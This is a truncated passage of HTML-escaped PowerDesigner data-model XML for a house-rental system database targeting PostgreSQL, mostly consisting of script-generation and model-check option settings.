;/a:TargetModelLastModificationDate&gt;&lt;c:SessionShortcuts&gt;&lt;o:Shortcut Ref=&quot;o3&quot;/&gt;&lt;/c:SessionShortcuts&gt;&lt;/o:TargetModel&gt;&lt;/c:TargetModels&gt;&lt;/o:Model&gt;&lt;/c:Children&gt;&lt;/o:RootObject&gt;&lt;/Model&gt; PDM &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?PowerDesigner AppLocale=&quot;UTF16&quot; ID=&quot;&#123;1F49DC66-529B-454F-8F5F-AC9E437B7E95&#125;&quot; Label=&quot;&quot; LastModificationDate=&quot;1618396943&quot; Name=&quot;房屋租赁系统PDM&quot; Objects=&quot;162&quot; Symbols=&quot;18&quot; Target=&quot;PostgreSQL 9.x&quot; Type=&quot;&#123;CDE44E21-9669-11D1-9914-006097355D9B&#125;&quot; signature=&quot;PDM_DATA_MODEL_XML&quot; version=&quot;16.6.1.5066&quot;?&gt;&lt;!--不要编辑此文件--&gt;&lt;Model xmlns:a=&quot;attribute&quot; xmlns:c=&quot;collection&quot; xmlns:o=&quot;object&quot;&gt;&lt;o:RootObject Id=&quot;o1&quot;&gt;&lt;c:Children&gt;&lt;o:Model Id=&quot;o2&quot;&gt;&lt;a:ObjectID&gt;1F49DC66-529B-454F-8F5F-AC9E437B7E95&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统PDM&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统PDM&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618332889&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618396943&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;E0CA7255-710D-4C0F-8906-045A9AB7CB75&#125;DAT 1618333034DLD &#123;03F00C02-4440-4501-8A4C-AFD5198963AF&#125;ATT FOPTATT NAMEATT CODE&lt;/a:History&gt;&lt;a:PackageOptionsText&gt;[FolderOptions][FolderOptions\\Physical Objects]GenerationCheckModel=YesGenerationPath=GenerationOptions=GenerationTasks=GenerationTargets=GenerationSelections=RevPkey=YesRevFkey=YesRevAkey=YesRevCheck=YesRevIndx=YesRevOpts=YesRevViewAsTabl=NoRevViewOpts=YesRevSystAsTabl=YesRevTablPerm=NoRevViewPerm=NoRevProcPerm=NoRevDbpkPerm=NoRevSqncPerm=NoRevAdtPerm=NoRevUserPriv=NoRevUserOpts=NoRevGrpePriv=NoRevRolePriv=NoRevDtbsOpts=YesRevDtbsPerm=NoRevViewIndx=YesRevJidxOpts=YesRevStats=NoRevTspcPerm=NoRevCaseSensitive=NoGenTrgrStdMsg=YesGenTrgrMsgTab=GenTrgrMsgNo=GenTrgrMsgTxt=TrgrPreserve=NoTrgrIns=YesTrgrUpd=YesTrgrDel=YesTrgrC2Ins=YesTrgrC2Upd=YesTrgrC3=YesTrgrC4=YesTrgrC5=YesTrgrC6=YesTrgrC7=YesTrgrC8=YesTrgrC9=YesTrgrC10=YesTrgrC11=YesTrgrC1=YesTrgrC12Ins=YesTrgrC12Upd=YesTrgrC13=YesUpdateTableStatistics=YesUpdateColumnStatistics=YesDeploymentMode=REP[FolderOptions\\Physical Objects\\Database Generation]GenScriptName=RentSystem.sqlGenScriptName0=library2.sqlGenScriptName1=library?.sqlGenScriptName2=library.sqlGenScriptName3=GenScriptName4=GenScriptName5=GenScriptName6=GenScriptName7=GenScriptName8=GenScriptName9=GenPathName=F:\\PowerDesigner\\Examples\\GenSingleFile=YesGenODBC=NoGenCheckModel=YesGenScriptPrev=YesGenArchiveModel=NoGenUseSync=NoGenSyncChoice=0GenSyncArch=GenSyncRmg=0[FolderOptions\\Physical Objects\\Database Generation\\Format]GenScriptTitle=YesGenScriptNamLabl=NoGenScriptQDtbs=NoGenScriptQOwnr=YesGenScriptCase=0GenScriptEncoding=ANSIGenScriptNAcct=NoIdentifierDelimiter=&amp;quot;[FolderOptions\\Physical Objects\\Database Generation\\Database]Create=YesOpen=YesClose=YesDrop=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Database\\Create]Physical Options=YesHeader=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\Tablespace]Create=YesDrop=YesComment=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Tablespace\\Create]Header=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\Storage]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\User]Create=YesDrop=YesComment=YesPrivilege=No[FolderOptions\\Physical Objects\\Database Generation\\User\\Create]Physical Options=No[FolderOptions\\Physical Objects\\Database Generation\\Group]Create=YesDrop=YesComment=YesPrivilege=No[FolderOptions\\Physical Objects\\Database Generation\\Role]Create=YesDrop=YesPrivilege=No[FolderOptions\\Physical Objects\\Database Generation\\UserDefinedDataType]Create=YesComment=YesDrop=Yes[FolderOptions\\Physical Objects\\Database Generation\\UserDefinedDataType\\Create]Default value=YesCheck=Yes[FolderOptions\\Physical Objects\\Database Generation\\AbstractDataType]Create=YesHeader=YesFooter=YesDrop=YesComment=YesInstall JAVA class=YesRemove JAVA class=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Rule]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Default]Create=YesComment=YesDrop=Yes[FolderOptions\\Physical Objects\\Database Generation\\Sequence]Create=YesDrop=YesComment=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column][FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Table]Create=YesDrop=YesComment=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Table\\Create]Check=YesPhysical Options=YesHeader=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Table\\Create\\Check]Constraint declaration=No[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Column]User datatype=YesDefault value=YesCheck=YesPhysical Options=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Column\\Check]Constraint declaration=No[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Key][FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Key\\Primary key]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Key\\Primary key\\Create]Constraint declaration=NoPhysical Options=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Key\\Alternate key]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Key\\Alternate key\\Create]Constraint declaration=NoPhysical Options=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Foreign key]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Foreign key\\Create]Constraint declaration=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Index]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Index\\Create]Constraint declaration=YesPhysical Options=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Index\\Filter]Primary key=YesForeign key=YesAlternate key=NoCluster=YesOther=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Trigger]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Table&amp;amp;&amp;amp;Column\\Trigger\\Filter]For insert=YesFor update=YesFor delete=YesFor other=Yes[FolderOptions\\Physical Objects\\Database Generation\\View]Create=YesDrop=YesComment=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\View\\Create]Force Column list=NoPhysical Options=YesHeader=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\ViewColumn]Comment=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\ViewIndex]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\ViewIndex\\Create]Physical Options=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\ViewIndex\\Filter]Cluster=YesOther=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\Trigger]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\View\\Trigger\\Filter]For insert=YesFor update=YesFor delete=YesFor other=Yes[FolderOptions\\Physical Objects\\Database Generation\\DBMSTrigger]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Synonym]Create=YesDrop=Yes[FolderOptions\\Physical Objects\\Database Generation\\Synonym\\Filter]Table=YesView=YesProc=YesSynonym=YesDatabase Package=YesSequence=Yes[FolderOptions\\Physical Objects\\Database Generation\\JoinIndex]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\JoinIndex\\Create]Physical Options=YesHeader=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\Procedure]Create=YesDrop=YesComment=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\Procedure\\Create]Header=YesFooter=Yes[FolderOptions\\Physical Objects\\Database Generation\\DatabasePackage]Create=YesDrop=YesPermission=No[FolderOptions\\Physical Objects\\Database Generation\\WebService]Create=YesDrop=YesComment=Yes[FolderOptions\\Physical Objects\\Database Generation\\Dimension]Create=YesDrop=Yes[FolderOptions\\Physical Objects\\Database Generation\\Synchronization]GenBackupTabl=1GenKeepBackTabl=1GenTmpTablDrop=NoGenKeepTablOpts=No[FolderOptions\\Physical Objects\\Test Data]GenDataPathName=GenDataSinglefile=YesGenDataScriptName=testdataGenDataScriptName0=GenDataScriptName1=GenDataScriptName2=GenDataScriptName3=GenDataScriptName4=GenDataScriptName5=GenDataScriptName6=GenDataScriptName7=GenDataScriptName8=GenDataScriptName9=GenDataOdbc=0GenDataDelOld=NoGenDataTitle=NoGenDataDefNumRows=20GenDataCommit=0GenDataPacket=0GenDataOwner=NoGenDataProfNumb=GenDataProfChar=GenDataProfDate=GenDataCSVSeparator=,GenDataFileFormat=CSVGenDataUseWizard=No[FolderOptions\\Pdm]IndxIQName=%COLUMN%_%INDEXTYPE%IndxPK=YesIndxFK=YesIndxAK=YesIndxPKName=%TABLE%_PKIndxFKName=%REFR%_FKIndxAKName=%TABLE%_AKIndxPreserve=YesIndxThreshold=0IndxStats=NoRefrPreserve=NoJidxPreserve=NoRbldMultiFact=YesRbldMultiDim=YesRbldMultiJidx=YesCubePreserve=NoTablStProcPreserve=NoProcDepPreserve=YesTrgrDepPreserve=YesCubeScriptPath=CubeScriptCase=0CubeScriptEncoding=ANSICubeScriptNacct=NoCubeScriptHeader=NoCubeScriptExt=csvCubeScriptExt0=txtCubeScriptExt1=CubeScriptExt2=CubeScriptSep=,CubeScriptDeli=&amp;quot;EstimationYears=0DfltDomnName=D_%.U:VALUE%DfltColnName=D_%.U:VALUE%DfltReuse=YesDfltDrop=Yes[FolderOptions\\CheckModel][FolderOptions\\CheckModel\\包][FolderOptions\\CheckModel\\包\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\CheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\DefaultCheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\CircularReference]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\ConstraintName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\CnstMaxLen]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\CircularDependency]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\包\\ShortcutUniqCode]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Table][FolderOptions\\CheckModel\\Table\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\UniqIndex]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\MaxLen - NAME]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\EmptyColl - COLNCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\EmptyColl - INDXCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\EmptyColl - KEYCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\SerialColumnNumber]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\EmptyCollYesYes]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\TableIndexes]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\Mapping]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\MappingSFMap]CheckSeverity=NoFixRequested=YesCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\EmptyColl - PERMCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Table\\CheckTablePartitionKey]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTableStartDate]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTableRefNoLifecycle]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTableSourceMapping]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTablePartialColumnMapping]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTableKeyColumnMapping]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table\\CheckTableNotOnLifecycleTablespace]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column][FolderOptions\\CheckModel\\Table.Column\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\DomainDivergence]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\ColumnMandatory]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\FkeyDttpDivergence]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\FkeyCheckDivergence]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\ColnSqncNoKey]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\ColnSqncDttp]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\SerialColumnFK]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\ColumnCompExpr]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckColumnOneToOneMapping]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckColumnDataTypeMapping]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckColumnNoMapping]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Column\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index][FolderOptions\\CheckModel\\Table.Index\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\EmptyColl - CIDXCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\UndefIndexType]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\IndexColumnCount]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\IQIndxHNGUniq]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Index\\CheckIncludeColl - Tabl]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key][FolderOptions\\CheckModel\\Table.Key\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\EmptyColl - COLNCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\CheckIncludeColl - Tabl]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Key\\MultiKeySqnc]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger][FolderOptions\\CheckModel\\Table.Trigger\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Table.Trigger\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index][FolderOptions\\CheckModel\\Join Index\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Join Index\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View][FolderOptions\\CheckModel\\View\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View\\EmptyColl - PERMCOL]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\View.View Index][FolderOptions\\CheckModel\\View.View Index\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\EmptyColl - CIDXCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\IndexColumnCount]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View.View Index\\CheckIncludeColl - Tabl]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference][FolderOptions\\CheckModel\\Reference\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\Reflexive]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\EmptyColl - RFJNCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\IncompleteJoin]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Reference\\JoinOrder]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference][FolderOptions\\CheckModel\\View Reference\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\View Reference\\EmptyColl - VRFJNCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain][FolderOptions\\CheckModel\\Domain\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\MaxLen - 